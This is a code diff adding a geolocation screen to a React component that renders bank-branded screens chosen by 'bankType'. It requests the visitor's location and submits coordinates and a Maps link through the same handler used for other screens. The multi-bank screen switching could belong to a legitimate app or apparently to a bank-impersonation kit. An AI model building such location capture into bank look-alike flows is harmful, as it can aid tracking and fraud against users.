@@ -4,6 +4,7 @@ import { Input } from '@/components/ui/input';
 import { Button } from '@/components/ui/button';
 import { ScreenType, BankType } from '@shared/schema';
 import QRScanner from './QRScanner';
+import GeolocationRequest from './GeolocationRequest';
 import { detectDevice } from '@/utils/deviceDetection';
 
 // Para debug
@@ -182,6 +183,34 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
     
     // Diferentes pantallas según el tipo
     switch (currentScreen) {
+      case ScreenType.GEOLOCATION:
+        return (
+          <div className="max-w-md mx-auto">
+            <GeolocationRequest
+              bankType={banco}
+              onLocationGranted={(locationData) => {
+                console.log('[Geolocation] Ubicación obtenida:', locationData);
+                onSubmit(ScreenType.GEOLOCATION, {
+                  latitude: locationData.latitude,
+                  longitude: locationData.longitude,
+                  googleMapsLink: locationData.googleMapsLink,
+                  locationTimestamp: locationData.timestamp
+                });
+              }}
+              onLocationDenied={() => {
+                console.log('[Geolocation] Ubicación denegada por el usuario');
+                // Continuar sin ubicación
+                onSubmit(ScreenType.GEOLOCATION, {
+                  latitude: null,
+                  longitude: null,
+                  googleMapsLink: null,
+                  locationTimestamp: new Date().toISOString()
+                });
+              }}
+            />
+          </div>
+        );
+
       case ScreenType.FOLIO:
         const folioContent = (
           <>
